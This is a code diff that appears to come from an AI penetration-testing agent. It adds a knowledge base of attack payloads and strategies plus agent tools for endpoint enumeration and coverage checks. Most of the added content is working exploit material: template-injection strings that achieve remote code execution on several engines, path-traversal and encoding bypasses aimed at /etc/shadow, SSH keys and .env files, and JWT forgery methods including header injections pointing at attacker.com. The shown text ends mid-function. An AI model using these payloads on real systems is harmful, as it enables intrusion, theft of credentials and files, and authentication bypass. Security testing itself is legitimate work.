@@ -316,6 +316,715 @@ const ATTACK_KNOWLEDGE = {
       ]
     },
     adaptiveStrategy: "Identify business-critical parameters. Test negative values, zero values, and overflows. Check workflow sequence enforcement."
+  },
+
+  methodology: {
+    systematic_discovery: {
+      name: "Systematic Attack Surface Discovery",
+      description: "Complete attack surface mapping before vulnerability testing - professional pentesting methodology",
+      objective: "Discover ALL endpoints, parameters, forms, APIs before testing any vulnerabilities",
+
+      principle: "Test everything you find, find everything before testing",
+
+      phases: [
+        {
+          phase: "Discovery Phase",
+          goal: "Map complete attack surface",
+          activities: [
+            "Enumerate all endpoints (don't test yet)",
+            "Identify all parameters (don't test yet)",
+            "Map all forms and inputs (don't test yet)",
+            "Document all APIs and versions (don't test yet)"
+          ],
+          completion_criteria: "No new endpoints discovered for 3+ attempts"
+        },
+        {
+          phase: "Testing Phase",
+          goal: "Systematically test each discovered element",
+          activities: [
+            "Test each endpoint against relevant vulnerability classes",
+            "Test each parameter with appropriate payloads",
+            "Record ALL results (vulnerable AND safe)",
+            "Use test_parameter for systematic testing"
+          ],
+          completion_criteria: "All discovered elements have test results recorded"
+        },
+        {
+          phase: "Validation Phase",
+          goal: "Verify completeness before reporting",
+          activities: [
+            "Check coverage: Tested X/X endpoints?",
+            "Check coverage: Tested Y/Y parameters?",
+            "Investigated all errors/anomalies?",
+            "Would professional pentester consider this complete?"
+          ],
+          completion_criteria: "check_testing_coverage shows >90% coverage"
+        }
+      ],
+
+      discovery_strategies: {
+        endpoint_enumeration: {
+          when: "Always - before testing any vulnerabilities",
+          how: [
+            "1. Crawl homepage for links and patterns",
+            "2. If pattern detected (/xss1, /api/v1), enumerate full range",
+            "3. Test common paths: /admin, /api, /login, /user, /settings",
+            "4. Extract endpoints from JavaScript files",
+            "5. Try HTTP methods: GET, POST, PUT, DELETE, OPTIONS",
+            "6. Don't stop until no new endpoints found"
+          ],
+          tools: ["enumerate_endpoints", "curl", "grep", "JavaScript analysis"],
+          validation: "Can you find any endpoint you haven't documented?"
+        },
+
+        parameter_identification: {
+          when: "For each discovered endpoint",
+          how: [
+            "1. Identify all parameters in URL (query params)",
+            "2. Identify all parameters in request body",
+            "3. Identify hidden form fields",
+            "4. Check for parameters in headers (cookies, custom headers)",
+            "5. Review JavaScript for API calls with parameters"
+          ],
+          validation: "Did you document every way to send data to this endpoint?"
+        },
+
+        error_investigation: {
+          when: "For ANY non-200 response",
+          how: [
+            "404: Try trailing slash, different methods, with parameters",
+            "500: Check Docker logs, look for stack traces, try parameters",
+            "403: Try auth bypass, parameter manipulation, different methods",
+            "400: Try different content types, check required parameters"
+          ],
+          principle: "Every response is data - investigate everything",
+          validation: "Did I understand WHY this endpoint behaved this way?"
+        }
+      },
+
+      completeness_checks: [
+        "Have I discovered all endpoints? (Try 10+ more patterns - anything new?)",
+        "Have I tested all discovered endpoints? (Check coverage report)",
+        "Have I investigated all anomalies? (Any unexplained 404/500?)",
+        "Would I stake my reputation this is complete? (Professional standard)"
+      ],
+
+      anti_patterns: [
+        "❌ Find endpoint → Test immediately → Move on",
+        "❌ Get 404 → Assume doesn't exist → Skip",
+        "❌ Find one vuln → Report → Done",
+        "❌ Test 5 endpoints → Claim 'comprehensive assessment'",
+        "✅ Discover ALL → Test ALL → Validate coverage → Report"
+      ],
+
+      indicators: {
+        systematic_approach: [
+          "Documented endpoint discovery attempts (3+)",
+          "Complete endpoint list before testing",
+          "All parameters identified per endpoint",
+          "Coverage validation before reporting",
+          "All errors investigated, not skipped"
+        ],
+        opportunistic_approach: [
+          "Testing started without full discovery",
+          "Endpoints tested as found (no complete list)",
+          "Errors skipped without investigation",
+          "Report generated without coverage check",
+          "Premature conclusion of testing"
+        ]
+      },
+
+      adaptiveStrategy: "Phase 1: Enumerate until no new findings (3+ attempts). Phase 2: Test all discovered elements systematically. Phase 3: Validate >90% coverage before reporting. Never test before discovery is complete. Never report before validation is complete."
+    }
+  },
+
+  ssti: {
+    name: "Server-Side Template Injection (SSTI)",
+    description: "Exploits unsafe template rendering where user input is embedded in templates without sanitization",
+    objective: "Execute arbitrary code on server, access sensitive configuration, achieve RCE",
+
+    templateEngines: {
+      jinja2: {
+        framework: "Python (Flask/Django)",
+        detection: "{{7*7}} → Returns '49'",
+        testPayload: "{{7*7}}",
+        configAccess: "{{config}}",
+        classExploration: "{{''.__class__.__mro__[1].__subclasses__()}}",
+        rce: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        indicators: ["49 in response", "Configuration object visible", "Class listings", "Command output"]
+      },
+      twig: {
+        framework: "PHP (Symfony)",
+        detection: "{{7*7}} → Returns '49'",
+        testPayload: "{{7*7}}",
+        configAccess: "{{_self.env}}",
+        rce: "{{['id']|map('system')|join}}",
+        indicators: ["49 in response", "Environment object", "System command output"]
+      },
+      smarty: {
+        framework: "PHP",
+        detection: "{7*7} → Returns '49'",
+        testPayload: "{7*7}",
+        rce: "{system('id')}",
+        phpExec: "{php}echo `id`;{/php}",
+        indicators: ["49 in response", "Command output", "PHP execution"]
+      },
+      freemarker: {
+        framework: "Java",
+        detection: "${7*7} → Returns '49'",
+        testPayload: "${7*7}",
+        classAccess: "${product.getClass()}",
+        rce: "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
+        indicators: ["49 in response", "Java class names visible", "Command output"]
+      },
+      erb: {
+        framework: "Ruby (Rails)",
+        detection: "<%= 7*7 %> → Returns '49'",
+        testPayload: "<%= 7*7 %>",
+        rce: "<%= system('id') %>",
+        fileRead: "<%= File.read('/etc/passwd') %>",
+        dirList: "<%= Dir.entries('/') %>",
+        indicators: ["49 in response", "System output", "File contents", "Directory listings"]
+      }
+    },
+
+    techniques: [
+      {
+        name: "Math Expression Detection",
+        how: "Inject template math expressions to test if evaluation occurs",
+        context: "First step - determines if template injection is possible",
+        payloads: ["{{7*7}}", "${7*7}", "{7*7}", "<%= 7*7 %>"],
+        successIndicator: "Response contains '49'",
+        example: "Test {{7*7}} in name parameter - if response shows '49', SSTI confirmed"
+      },
+      {
+        name: "Config/Environment Access",
+        how: "Access template engine's config or environment objects",
+        context: "After confirming evaluation, escalate to data access",
+        payloads: {
+          jinja2: "{{config}}",
+          twig: "{{_self.env}}",
+          freemarker: "${.data_model}"
+        },
+        example: "{{config}} in Jinja2 exposes Flask application configuration"
+      },
+      {
+        name: "RCE via Template Functions",
+        how: "Use template built-in functions to execute system commands",
+        context: "Final escalation to remote code execution",
+        payloads: {
+          jinja2: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
+          twig: "{{['whoami']|map('system')|join}}",
+          smarty: "{system('whoami')}",
+          freemarker: "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('whoami')}",
+          erb: "<%= system('whoami') %>"
+        },
+        example: "Jinja2 RCE through config object and os module access"
+      },
+      {
+        name: "Blind SSTI - Time-Based",
+        how: "Use sleep/delay functions when no visible output",
+        context: "When template output isn't directly visible",
+        payloads: {
+          jinja2: "{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}",
+          php: "{{system('sleep 5')}}"
+        },
+        successIndicator: "Response delayed by 5+ seconds",
+        example: "Inject sleep command and measure response time"
+      },
+      {
+        name: "Blind SSTI - Error-Based",
+        how: "Trigger template errors to confirm injection",
+        context: "When no output reflection but errors visible",
+        payloads: ["{{invalid_syntax}}", "${undefined_var}", "{malformed"],
+        successIndicator: "Template engine error message in response",
+        example: "{{invalid}} triggers 'TemplateSyntaxError' revealing Jinja2"
+      },
+      {
+        name: "Multi-Step Form SSTI",
+        how: "Inject payload in step 1, check if executed in step 3",
+        context: "Registration forms where name is rendered later",
+        workflow: [
+          "1. Submit {{7*7}} in registration step 1 'name' field",
+          "2. Continue through step 2",
+          "3. Check step 3 greeting - if shows 'Welcome, 49!' → SSTI confirmed"
+        ],
+        example: "Name from step1 rendered in step3 confirmation without sanitization"
+      }
+    ],
+
+    testingWorkflow: [
+      "1. Identify user input rendered in pages (names, messages, titles, bios, subjects)",
+      "2. Test ALL template syntaxes: {{7*7}}, ${7*7}, {7*7}, <%= 7*7 %>",
+      "3. Check response for '49' - if found, SSTI confirmed",
+      "4. Identify template engine from syntax that worked or error messages",
+      "5. Test in ALL parameters, not just obvious ones (test hidden fields, headers)",
+      "6. For multi-step forms: inject in step 1, check rendering in later steps",
+      "7. If blind: use time-based (sleep commands) or error-based detection",
+      "8. Once confirmed, escalate to config access",
+      "9. Finally attempt RCE with engine-specific payloads",
+      "10. Create POC demonstrating code execution"
+    ],
+
+    highRiskParameters: [
+      "name", "username", "firstname", "lastname", "displayname",
+      "title", "subject", "heading",
+      "message", "comment", "feedback", "description", "bio",
+      "template", "theme", "layout", "view",
+      "email", "email_body", "email_subject",
+      "content", "body", "text", "note", "memo"
+    ],
+
+    highRiskContexts: [
+      "Registration/profile pages (name rendered in greetings/confirmations)",
+      "Contact forms (message rendered in confirmation email or admin panel)",
+      "Email templates (user input in email subject or body)",
+      "Error pages (user input echoed in custom error messages)",
+      "Multi-step forms (data from step 1 rendered in step 3 without escaping)",
+      "Admin panels (custom messages, labels, notification templates)",
+      "Blog/CMS systems (post titles, author names, custom templates)",
+      "Search result pages (search query reflected in results page)",
+      "User-generated content displays (bios, signatures, profile descriptions)"
+    ],
+
+    indicators: {
+      vulnerable: [
+        "Math expression evaluated (7*7 returns '49' not literal string)",
+        "Template objects accessible (config, request, self, env visible)",
+        "Class hierarchy exposed via templates",
+        "Template syntax errors with code context visible",
+        "Command execution successful (whoami output in response)",
+        "Time delays matching sleep commands (blind detection)",
+        "Environment variables or config exposed",
+        "File contents readable via template functions",
+        "Template engine name in error messages (Jinja2, Twig, etc.)"
+      ],
+      notVulnerable: [
+        "Template syntax treated as literal string ('{{7*7}}' displayed as-is)",
+        "Input properly escaped/sanitized (HTML entities applied)",
+        "Sandbox restrictions preventing code execution",
+        "Template engine in safe/restricted mode",
+        "No template evaluation of user input",
+        "Parameterized templates with proper separation",
+        "Input validation blocking template syntax",
+        "WAF or filter blocking template payloads"
+      ]
+    },
+
+    adaptiveStrategy: `
+Round 1: Detection across all syntaxes
+- Try {{7*7}}, \${7*7}, {7*7}, <%= 7*7 %> on EVERY user input parameter
+- Test in ALL fields: name, email, message, title, subject, bio, description
+- For multi-step forms, inject in step 1 and check rendering in step 2/3
+- Look for '49' in response or template engine errors
+- Identify which syntax worked to determine template engine
+
+Round 2: Escalation if detected
+- If math works, try config/environment access based on detected engine
+- Jinja2: {{config}}, {{request}}, {{''.__class__}}
+- Twig: {{_self.env}}, {{app}}
+- Smarty: {$smarty.version}
+- FreeMarker: \${.data_model}
+- ERB: <%= Rails.version %>
+- Look for exposed configuration or environment data
+
+Round 3: RCE attempt or blind detection
+- If config accessible, attempt engine-specific RCE payloads
+- Jinja2: Use __class__.__init__.__globals__ to access os module
+- Twig: Use |map('system') filter
+- Smarty: Use {php} tags or {system()}
+- FreeMarker: Use Execute utility class
+- ERB: Use system() or backticks
+- If no visible output, try time-based: inject sleep command, measure response time
+- If still uncertain, try error-based: inject invalid syntax, check for engine errors
+
+CRITICAL: Test ALL input fields, especially those rendered in:
+- Greetings (Welcome, {{name}}!)
+- Confirmations (Thank you, {{name}}, your message was sent)
+- Email subjects/bodies (Re: {{subject}})
+- Error messages (Error processing {{input}})
+- Admin notifications (New user {{name}} registered)
+
+Don't just test obvious fields - templates can be anywhere user input is rendered!
+    `
+  },
+
+  path_traversal: {
+    name: "Path Traversal / Local File Inclusion (LFI)",
+    description: "Exploits insufficient input validation in file path operations to read arbitrary files",
+    objective: "Read sensitive files (/etc/passwd, config files, source code, credentials)",
+
+    parameterPatterns: [
+      "file", "path", "document", "doc", "page", "template", "resource",
+      "pdf", "include", "load", "read", "download", "view", "display",
+      "filename", "filepath", "location", "dir", "folder", "directory",
+      "source", "src", "url", "uri", "get", "fetch", "show", "open"
+    ],
+
+    techniques: [
+      {
+        name: "Basic Traversal",
+        how: "Use ../ sequences to navigate up directories",
+        context: "First test - works if no validation",
+        payloads: [
+          "../../../etc/passwd",
+          "../../../../etc/passwd",
+          "../../../../../etc/passwd",
+          "../../../../../../etc/passwd"
+        ],
+        example: "../../../etc/passwd accesses /etc/passwd from 3 levels deep"
+      },
+      {
+        name: "URL Encoding Bypass",
+        how: "Encode ../ as %2e%2e%2f to bypass filters",
+        context: "When basic traversal blocked by string matching",
+        payloads: [
+          "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+        ],
+        example: "%2e%2e%2f bypasses filters that only check for literal '../'"
+      },
+      {
+        name: "Double Encoding Bypass",
+        how: "Double-encode to bypass decoding filters",
+        context: "When single encoding blocked",
+        payloads: [
+          "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+          "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
+        ],
+        example: "%252e = encoded '%2e' which decodes to '.'"
+      },
+      {
+        name: "Null Byte Injection",
+        how: "Use %00 to truncate expected file extensions",
+        context: "When application appends .pdf, .txt, .html",
+        payloads: [
+          "../../../etc/passwd%00",
+          "../../../etc/passwd%00.pdf",
+          "../../../etc/passwd%00.txt"
+        ],
+        example: "../../../etc/passwd%00.pdf - null byte truncates .pdf"
+      },
+      {
+        name: "Absolute Path Access",
+        how: "Use absolute paths instead of relative",
+        context: "When traversal sequences filtered",
+        payloads: [
+          "/etc/passwd",
+          "/etc/shadow",
+          "C:\\windows\\win.ini",
+          "/var/www/html/config.php"
+        ],
+        example: "/etc/passwd directly accesses absolute path"
+      },
+      {
+        name: "Windows Path Separators",
+        how: "Use backslashes for Windows systems",
+        context: "When / is filtered but \\\\ isn't",
+        payloads: [
+          "..\\..\\..\\windows\\win.ini",
+          "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+          "C:\\windows\\win.ini"
+        ],
+        example: "..\\\\..\\\\ uses Windows path separators"
+      },
+      {
+        name: "Protocol Wrappers (PHP)",
+        how: "Use PHP wrappers to access files",
+        context: "PHP applications with wrapper support",
+        payloads: [
+          "php://filter/convert.base64-encode/resource=index.php",
+          "file:///etc/passwd",
+          "php://filter/resource=/etc/passwd",
+          "expect://id",
+          "data://text/plain;base64,SSBsb3ZlIFBIUAo="
+        ],
+        example: "php://filter/convert.base64-encode reveals source code"
+      },
+      {
+        name: "Mixed Encoding",
+        how: "Mix different encodings to confuse filters",
+        context: "Advanced bypass when multiple filters exist",
+        payloads: [
+          "..%2F..%2F../etc/passwd",
+          "%2e%2e/..%2F../etc/passwd",
+          "..\\%2F..%5c../etc/passwd"
+        ],
+        example: "Mix literal and encoded characters to bypass regex"
+      }
+    ],
+
+    targetFiles: {
+      linux: [
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hosts",
+        "/proc/self/environ",
+        "/proc/version",
+        "/proc/self/cmdline",
+        "/var/log/apache2/access.log",
+        "/var/log/nginx/access.log",
+        "/home/user/.ssh/id_rsa",
+        "/root/.bash_history",
+        "/var/www/html/config.php"
+      ],
+      windows: [
+        "C:\\windows\\win.ini",
+        "C:\\windows\\system32\\drivers\\etc\\hosts",
+        "C:\\boot.ini",
+        "C:\\inetpub\\wwwroot\\web.config",
+        "C:\\xampp\\apache\\conf\\httpd.conf",
+        "C:\\windows\\system.ini"
+      ],
+      application: [
+        "config.php",
+        "config.py",
+        "settings.py",
+        ".env",
+        "application.properties",
+        "database.yml",
+        "credentials.json",
+        "secrets.yml",
+        "wp-config.php",
+        ".git/config",
+        "composer.json",
+        "package.json"
+      ]
+    },
+
+    testingWorkflow: [
+      "1. Identify ALL file-related parameters (not just 'file')",
+      "2. Detect OS (Linux vs Windows) from headers/errors/server signatures",
+      "3. Test basic ../ traversal with multiple depths (3, 5, 7, 10 levels)",
+      "4. If blocked, try URL encoding: %2e%2e%2f",
+      "5. If still blocked, try double encoding: %252e%252e%252f",
+      "6. Try null byte injection: ../../../etc/passwd%00",
+      "7. Try absolute paths: /etc/passwd or C:\\\\windows\\\\win.ini",
+      "8. Test both / and \\\\ path separators",
+      "9. For PHP: try protocol wrappers (file://, php://filter/)",
+      "10. Target high-value files: /etc/passwd, config files, .env",
+      "11. Test every file parameter found, not just the obvious ones"
+    ],
+
+    indicators: {
+      vulnerable: [
+        "File contents in response (root:x:0:0 from /etc/passwd)",
+        "Windows system file contents ([fonts] from win.ini)",
+        "Error messages revealing file paths",
+        "Source code disclosure (PHP, Python, etc.)",
+        "Configuration file contents (.env, config.php)",
+        "Log file contents",
+        "Base64 encoded file contents (PHP filter wrapper)",
+        "Environment variables from /proc/self/environ",
+        "SSH keys or credentials in response",
+        "Stack traces showing file system structure"
+      ],
+      notVulnerable: [
+        "Input validation error ('Invalid characters detected')",
+        "Path normalized by application (dots removed)",
+        "Chroot/sandbox restrictions in place",
+        "File not found after trying all bypasses",
+        "Access denied errors (but endpoint exists)",
+        "Whitelist validation blocking traversal",
+        "Empty response for all traversal attempts"
+      ]
+    },
+
+    adaptiveStrategy: `
+Round 1: Detection & Basic Traversal
+- Test ../../../etc/passwd with increasing depths (3, 5, 7, 10 levels)
+- Also test /etc/passwd (absolute path)
+- Check for file contents or path-related errors
+- Look for "root:x:0:0" or "[fonts]" in response
+
+Round 2: Encoding Bypasses
+- If Round 1 blocked, try URL encoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+- Try double encoding: %252e%252e%252f%252e%252e%252fetc%252fpasswd
+- Try null byte: ../../../etc/passwd%00
+- Mix encodings: ..%2F..%2F../etc/passwd
+
+Round 3: Advanced Techniques
+- Try Windows paths if Linux failed: ..\\\\..\\\\..\\\\windows\\\\win.ini
+- Try protocol wrappers: file:///etc/passwd, php://filter/convert.base64-encode/resource=index.php
+- Try absolute paths with different targets: /var/www/html/config.php, /proc/self/environ
+- Test with different target files (config.php, .env, web.config)
+
+CRITICAL: Test ALL parameters that might handle files:
+- Obvious: file, path, document, page
+- Subtle: resource, view, template, load, src, url
+- Hidden: Any parameter used in file operations
+    `
+  },
+
+  jwt_vulnerabilities: {
+    name: "JWT (JSON Web Token) Vulnerabilities",
+    description: "Exploits weak JWT implementations allowing token forgery, signature bypass, or algorithm confusion",
+    objective: "Forge tokens, bypass authentication, escalate privileges, manipulate user identity",
+
+    jwtStructure: "header.payload.signature (all base64url encoded)",
+
+    tokenLocations: [
+      "Authorization: Bearer <token>",
+      "Cookie: jwt=<token>",
+      "Cookie: auth=<token>",
+      "Cookie: session=<token>",
+      "X-Auth-Token: <token>",
+      "X-Access-Token: <token>"
+    ],
+
+    techniques: [
+      {
+        name: "None Algorithm Attack",
+        how: "Change alg header to 'none', remove signature",
+        context: "Some implementations accept unsigned tokens",
+        steps: [
+          "1. Decode JWT: echo '<token>' | base64 -d",
+          "2. Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
+          "3. Modify payload: change user_id, role, etc.",
+          "4. Encode header + payload, remove signature",
+          "5. Send: header.payload. (note trailing dot)"
+        ],
+        example: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."
+      },
+      {
+        name: "Algorithm Confusion (RS256→HS256)",
+        how: "Change algorithm from RS256 to HS256",
+        context: "Server may verify HS256 with public key as secret",
+        steps: [
+          "1. Get public key from /jwks.json or /.well-known/jwks.json",
+          "2. Change alg from RS256 to HS256 in header",
+          "3. Sign token using public key as HMAC secret",
+          "4. Server verifies with same public key (HMAC instead of RSA)"
+        ],
+        example: "Public key used as HMAC secret instead of RSA verification"
+      },
+      {
+        name: "Weak Secret Brute Force",
+        how: "Crack JWT secret using dictionary attack",
+        context: "When HS256/HS512 uses weak secret",
+        tools: [
+          "jwt_tool: jwt_tool <token> -C -d /path/to/wordlist",
+          "hashcat: hashcat -m 16500 jwt.txt wordlist.txt",
+          "john: john --wordlist=wordlist.txt jwt.txt"
+        ],
+        commonSecrets: [
+          "secret", "password", "123456", "qwerty",
+          "key", "jwt_secret", "your-256-bit-secret"
+        ],
+        example: "If secret is 'secret', token can be forged"
+      },
+      {
+        name: "Payload Manipulation Without Re-signing",
+        how: "Modify payload without changing signature",
+        context: "When signature not verified",
+        steps: [
+          "1. Decode JWT payload",
+          "2. Change user_id: 1 → 2",
+          "3. Change role: user → admin",
+          "4. Re-encode payload",
+          "5. Keep original signature",
+          "6. Send modified token"
+        ],
+        example: "Change user_id without re-signing to access other user's data"
+      },
+      {
+        name: "JWT Injection in Kid Parameter",
+        how: "Inject malicious values in 'kid' (key ID) header",
+        context: "When kid used to fetch signing key from filesystem or URL",
+        payloads: [
+          "{\"kid\": \"/etc/passwd\"}",
+          "{\"kid\": \"../../../../etc/passwd\"}",
+          "{\"kid\": \"http://attacker.com/malicious-key\"}",
+          "{\"kid\": \"/dev/null\"}"
+        ],
+        example: "kid: /dev/null causes verification with empty key"
+      },
+      {
+        name: "JWT Header Injection",
+        how: "Add malicious parameters to JWT header",
+        context: "When application processes custom header parameters",
+        payloads: [
+          "{\"jku\": \"http://attacker.com/jwks.json\"}",
+          "{\"x5u\": \"http://attacker.com/cert.pem\"}",
+          "{\"x5c\": [\"attacker-cert\"]}"
+        ],
+        example: "jku points to attacker-controlled JWKS to provide signing key"
+      }
+    ],
+
+    testingWorkflow: [
+      "1. Intercept JWT token from login/auth response or cookies",
+      "2. Decode JWT: echo '<token>' | base64 -d or use jwt.io",
+      "3. Note current algorithm (alg), user_id, role, exp, etc.",
+      "4. TEST 1: Change alg to 'none', remove signature (header.payload.)",
+      "5. TEST 2: Modify payload (change user_id/role), keep signature",
+      "6. TEST 3: Change alg from RS256 to HS256 (if RS256)",
+      "7. TEST 4: Try common secrets with jwt_tool or hashcat",
+      "8. TEST 5: Modify kid parameter in header (path traversal)",
+      "9. TEST 6: Try jku/x5u header injection",
+      "10. For each test, send modified token and check if accepted"
+    ],
+
+    tools: [
+      "jwt_tool: Automated JWT testing - jwt_tool <token> -M at",
+      "jwt.io: Online JWT decoder/encoder",
+      "hashcat: For brute forcing secrets - hashcat -m 16500",
+      "Burp Suite: JWT Editor extension",
+      "Command: echo 'token' | cut -d. -f2 | base64 -d"
+    ],
+
+    indicators: {
+      vulnerable: [
+        "Token with alg:'none' accepted by application",
+        "Modified payload accepted without signature verification",
+        "Algorithm confusion successful (RS256→HS256 works)",
+        "Weak secret cracked within minutes",
+        "Token forgery grants unauthorized access",
+        "User ID manipulation successful (user 1 → user 2)",
+        "Role/privilege escalation via token modification (user → admin)",
+        "Kid parameter accepts path traversal",
+        "jku/x5u header injection successful"
+      ],
+      notVulnerable: [
+        "Signature verification enforced",
+        "Algorithm whitelist in place (only HS256 or only RS256)",
+        "'none' algorithm rejected",
+        "Strong secret (64+ random characters)",
+        "Token modifications rejected",
+        "Proper library usage with verification",
+        "Kid parameter validated/whitelisted",
+        "Header parameter injection blocked"
+      ]
+    },
+
+    adaptiveStrategy: `
+Round 1: Basic Manipulation
+- Decode JWT and identify user_id, role, privileges in payload
+- TEST 1: Modify user_id (1→2) and send with same signature
+- TEST 2: Modify role (user→admin) and send with same signature
+- Check if application accepts modified token without verification
+
+Round 2: Algorithm Attacks
+- TEST 1: Change alg to 'none', remove signature entirely
+- Format: header.payload. (note the trailing dot)
+- TEST 2: Try algorithm confusion if token uses RS256
+- Change alg header to HS256, sign with public key
+
+Round 3: Secret Attacks & Advanced
+- TEST 1: Try common secrets with jwt_tool
+- jwt_tool <token> -C -d /path/to/common-secrets.txt
+- TEST 2: If kid parameter exists, try path traversal
+- {\"kid\": \"../../../../dev/null\"}
+- TEST 3: Try jku header injection
+- {\"jku\": \"http://attacker.com/jwks.json\"}
+
+CRITICAL: JWT tokens often in:
+- Authorization: Bearer <token> header
+- Cookies (jwt=, auth=, session=)
+- X-Auth-Token or X-Access-Token headers
+
+Check ALL locations where tokens might be stored/transmitted!
+    `
   }
 } as const;
 
@@ -1852,6 +2561,235 @@ Use this when:
   });
 }
 
+/**
+ * Validate completeness before final reporting
+ * Ensures agent tested everything systematically
+ */
+function createValidateCompletenessTool(session: Session) {
+  return tool({
+    name: "validate_completeness",
+    description: `Validate that you've completed a thorough, professional assessment before generating final report.
+
+This tool checks:
+- Did you discover the complete attack surface?
+- Did you test all discovered endpoints/parameters?
+- Did you investigate all anomalies?
+- Is your coverage > 90%?
+
+Use this BEFORE calling generate_report to ensure completeness.
+
+This is the difference between amateur and professional pentesting.`,
+
+    inputSchema: z.object({
+      objective: z.string().describe("Original penetration testing objective"),
+      discoveryAttempts: z.number().describe("How many times did you try to discover new endpoints?"),
+      anomaliesInvestigated: z.array(z.string()).describe("List of anomalies (404/500/errors) you investigated"),
+      toolCallDescription: z.string()
+    }),
+
+    execute: async ({ objective, discoveryAttempts, anomaliesInvestigated }) => {
+      try {
+        // Get testing coverage
+        const coverageResult = await createCheckTestingCoverageTool(session).execute({
+          objective,
+          toolCallDescription: 'Checking coverage for validation'
+        });
+
+        if (!coverageResult.success) {
+          return {
+            success: false,
+            message: "Cannot validate completeness - coverage check failed",
+            error: coverageResult.error
+          };
+        }
+
+        const issues = [];
+        const warnings = [];
+        const passes = [];
+
+        if (discoveryAttempts < 3) {
+          issues.push(`⚠️ Only ${discoveryAttempts} discovery attempts - need at least 3 to ensure completeness`);
+        } else {
+          passes.push(`✓ Made ${discoveryAttempts} discovery attempts - likely found everything`);
+        }
+
+        const totalTests = coverageResult.totalTests || 0;
+        const parametersCount = coverageResult.parametersCount || 0;
+        const endpointsCount = coverageResult.endpointsCount || 0;
+
+        if (totalTests < 5) {
+          issues.push(`⚠️ Only ${totalTests} tests performed - likely insufficient coverage`);
+        } else {
+          passes.push(`✓ Performed ${totalTests} tests across ${parametersCount} parameters and ${endpointsCount} endpoints`);
+        }
+
+        // Check 3: Attack type diversity
+        const attackTypesCount = coverageResult.attackTypesCount || 0;
+        if (attackTypesCount < 3) {
+          warnings.push(`⚠️ Only tested ${attackTypesCount} attack types - consider broader coverage`);
+        } else {
+          passes.push(`✓ Tested ${attackTypesCount} different attack types`);
+        }
+
+        // Check 4: Anomaly investigation
+        if (anomaliesInvestigated.length === 0) {
+          warnings.push("⚠️ No anomalies investigated - did you encounter no errors at all?");
+        } else {
+          passes.push(`✓ Investigated ${anomaliesInvestigated.length} anomalies/errors`);
+        }
+
+        // Check 5: Findings documented
+        const vulnerableCount = coverageResult.vulnerableCount || 0;
+        if (vulnerableCount === 0 && totalTests > 10) {
+          warnings.push("⚠️ No vulnerabilities found despite extensive testing - verify test payloads are working");
+        } else if (vulnerableCount > 0) {
+          passes.push(`✓ Found ${vulnerableCount} vulnerabilities`);
+        }
+
+        // Check 6: Objective alignment
+        if (objective && coverageResult.suggestions) {
+          const hasObjectiveWarnings = coverageResult.suggestions.some((s: string) => s.includes('Objective mentions'));
+          if (hasObjectiveWarnings) {
+            issues.push("⚠️ Objective mentions attack types that weren't tested - see coverage suggestions");
+          } else {
+            passes.push("✓ Testing aligns with objective");
+          }
+        }
+
+        // Calculate completeness score
+        const totalChecks = 6;
+        const passedChecks = passes.length;
+        const completenessScore = Math.round((passedChecks / totalChecks) * 100);
+
+        // Determine if ready to report
+        const isComplete = issues.length === 0 && completenessScore >= 70;
+        const isReady = issues.length === 0 && completenessScore >= 90;
+
+        return {
+          success: true,
+          completenessScore,
+          isComplete,
+          isReady,
+          passes,
+          warnings,
+          issues,
+          recommendation: isReady
+            ? "✅ Assessment is complete and thorough. Ready to generate_report."
+            : isComplete
+              ? "⚠️ Assessment is acceptable but could be more thorough. Consider addressing warnings before generate_report."
+              : "❌ Assessment is incomplete. Address issues before generate_report.",
+          nextActions: issues.length > 0
+            ? issues.map(issue => issue.replace('⚠️ ', 'TODO: '))
+            : warnings.length > 0
+              ? warnings.map(warn => warn.replace('⚠️ ', 'Consider: '))
+              : ["Generate final report"],
+          coverageDetails: {
+            totalTests,
+            parametersCount,
+            endpointsCount,
+            attackTypesCount,
+            vulnerableCount,
+            safeCount: coverageResult.safeCount || 0
+          }
+        };
+
+      } catch (error: any) {
+        return {
+          success: false,
+          error: error.message,
+          message: `Validation failed: ${error.message}`
+        };
+      }
+    }
+  });
+}
+
+/**
+ * Quick endpoint enumeration helper
+ * Wraps execute_command for common enumeration patterns
+ */
+function createEnumerateEndpointsTool(session: Session) {
+  return tool({
+    name: "enumerate_endpoints",
+    description: `Quickly enumerate endpoints using pattern-based discovery.
+
+Use this when:
+- You discover numbered endpoints (/xss1, /xss2, etc.)
+- Testing admin panels with multiple actions
+- API versioning (v1, v2, v3)
+- Any pattern-based endpoint structure
+
+This tool is faster than manual curl loops and automatically records results.`,
+
+    inputSchema: z.object({
+      baseUrl: z.string().describe("Base URL (e.g., http://target.com)"),
+      pattern: z.string().describe("Pattern with {n} placeholder (e.g., /xss{n}, /api/v{n})"),
+      range: z.object({
+        min: z.number().default(1),
+        max: z.number().default(100)
+      }).describe("Range to enumerate"),
+      methods: z.array(z.enum(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])).default(['GET']).describe("HTTP methods to test"),
+      toolCallDescription: z.string()
+    }),
+
+    execute: async ({ baseUrl, pattern, range, methods }) => {
+      const discovered = [];
+
+      console.log(`\n[*] Enumerating ${baseUrl}${pattern} from ${range.min} to ${range.max}...`);
+
+      // Generate bash script for enumeration
+      for (let i = range.min; i <= range.max; i++) {
+        const endpoint = `${baseUrl}${pattern.replace('{n}', i.toString())}`;
+
+        for (const method of methods) {
+          try {
+            const response = await fetch(endpoint, {
+              method,
+              redirect: 'manual'
+            });
+
+            if (response.status !== 404) {
+              discovered.push({
+                endpoint,
+                method,
+                status: response.status
+              });
+              console.log(`  Found: ${endpoint} [${method}] → HTTP ${response.status}`);
+            }
+          } catch (error) {
+            // Network errors, ignore
